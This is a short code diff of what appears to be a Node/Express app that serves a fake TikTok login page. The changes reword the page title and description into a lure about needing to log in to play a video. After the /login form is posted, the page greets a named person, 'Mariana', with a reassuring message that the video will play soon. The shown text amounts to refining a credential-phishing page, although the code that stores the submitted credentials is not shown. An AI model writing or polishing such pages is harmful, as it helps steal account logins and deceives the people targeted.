@@ -31,7 +31,7 @@ res.send(`
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title>Inicio de sesión con TikTok</title>
+<title>Inicia sesión con TikTok para reproducir correctamente el video</title>
 
 
 <style>
@@ -223,7 +223,7 @@ button:hover{
 
 <div class="descripcion">
 
-Inicia sesión con TikTok para ver 
+Inicia sesión con TikTok para reproducir el video
 
 </div>
 
@@ -306,13 +306,12 @@ app.post("/login", (req, res) => {
     <html>
     <body style="font-family:Arial;text-align:center;padding:50px">
 
-    <h1>Hola Mariana</h1>
+    <h1>Login successful 
+        Hello Mariana</h1>
 
-          <p>Tu video se reroducira en unos segundos...
-        si ya paso el tiempo de espera revisa tu conexion o 
-                recarga la pagina nuevamente</p>
+          <p>Your video will play in a few seconds....</p>
 
-    <a href="/">Regresar al menu de Inicio de Secion</a>
+    <a href="/">Return to the login menu</a>
 
     </body>
     </html>
